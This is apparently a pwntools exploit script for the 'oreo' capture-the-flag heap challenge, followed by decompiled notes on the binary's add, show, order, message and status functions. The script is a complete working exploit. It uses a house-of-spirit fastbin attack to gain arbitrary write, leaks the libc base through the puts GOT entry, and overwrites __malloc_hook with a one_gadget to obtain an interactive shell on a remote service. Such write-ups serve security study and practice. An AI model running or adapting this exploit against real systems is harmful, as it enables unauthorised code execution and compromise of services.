#!/usr/bin/env python3

from pwn import *

exe = ELF("./oreo")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")

context.binary = exe


def conn():
    if args.LOCAL:
        return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
    else:
        return remote("addr", 1337)


def main():
    r = conn()

    def add(name, desc):
    	r.sendline("1")
    	r.sendline(name)
    	r.sendline(desc)

    def show():
    	r.sendline("2")

    def order():
    	r.sendline("3")

    def message(data):
    	r.sendline("4")
    	r.sendline(data)

    def status():
    	r.sendline("5")

    # write fake chunk nr. 2's size
    message("\x00"*36 + p32(0x60))

    # we add the address that we will want to free.
    # it will be freed at last and will be at the head of 0x40 fastbin
    add("\x00"*0x1b + p32(0x0804a2a0+8), "c00l desc")

    # increment NEW_RIFLES_COUNT_0804a2a4 until is 0x40 (fake chunk nr. 1 size)
    for i in range(0x3f):
    	add("c00l gun", "c00l desc")
    
    # free the chunks. we will perform house of spirit here
    show()
    order()

    # now the head chunk will be 0x0804a2a0. When we will alocate, we can overwrite the value at 0x0804a2a8
    # using message, we can achieve arbitrary write and read

    # libc infoleak
    add("c00l man", p32(exe.got['puts']))
    status()
    r.recvuntil("Order Message: ")
    leak = u32(r.recvn(4))
    libc.address = leak - libc.symbols['puts']
    log.info("libc base address: {}".format(hex(libc.address)))
    
    # overwrite __malloc_hook with one_gadget
    one_gadget = libc.address + 0x3ac69 
    order()
    add("c00l man", p32(libc.symbols['__malloc_hook']))
    message(p32(one_gadget))
    r.sendline("1")

    #gdb.attach(r)
    r.interactive()


if __name__ == "__main__":
    main()
'''
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

add
	- malloc(0x38), saves in 0x0804a288
	- saves intial value of 0x0804a288 in *(0x0804a288 + 0x34)
	- writes rifle name - fgets((*(0804a288) + 0x19),0x38,stdin);
	- calls function that replaces newline with null
	- writes description - fgets(*(0804a288),0x38,stdin);
	- calls function that replaces newline with null
	NEW_RIFLES_COUNT_0804a2a4 = NEW_RIFLES_COUNT_0804a2a4 + 1;
	- note: intial value, name, message and description can overlap !!!!!!!!!!!!!

show
	local_18 = DAT_0804a288;
 	while (local_18 != 0) {
    	printf("Name: %s\n",local_18 + 0x19);
    	printf("Description: %s\n",local_18);
    	puts("===================================");
    	local_18 = *(int *)(local_18 + 0x34);
  	}

order
	- checks if is rifles to be ordered counter is not empty
	  while (local_18 != (void *)0x0) {
      pvVar1 = *(void **)((int)local_18 + 0x34);
      free(local_18);
      local_18 = pvVar1;
    }
    DAT_0804a288 = (void *)0x0;
	ORDER_COUNT_0804a2a0 = ORDER_COUNT_0804a2a0 + 1;
    puts("Okay order submitted!");

    NEW_RIFLES_COUNT_0804a2a4 IS NOT SET TO 0??????

message
	- in main: 
	NEW_RIFLES_COUNT_0804a2a4 = 0;
  	ORDER_COUNT_0804a2a0 = 0;
  	MESSAGE_0804a2a8 = &DAT_0804a2c0;
	
	fgets(MESSAGE_0804a2a8,0x80,stdin);
  	replace_newline_w/_NULL(MESSAGE_0804a2a8);

status
	puts("======= Status =======");
  	printf("New:    %u times\n",NEW_RIFLES_COUNT_0804a2a4);
  	printf("Orders: %u times\n",ORDER_COUNT_0804a2a0);
  	if (*MESSAGE_0804a2a8 != '\0') {
    	printf("Order Message: %s\n",MESSAGE_0804a2a8);
  	}
  	puts("======================");

'''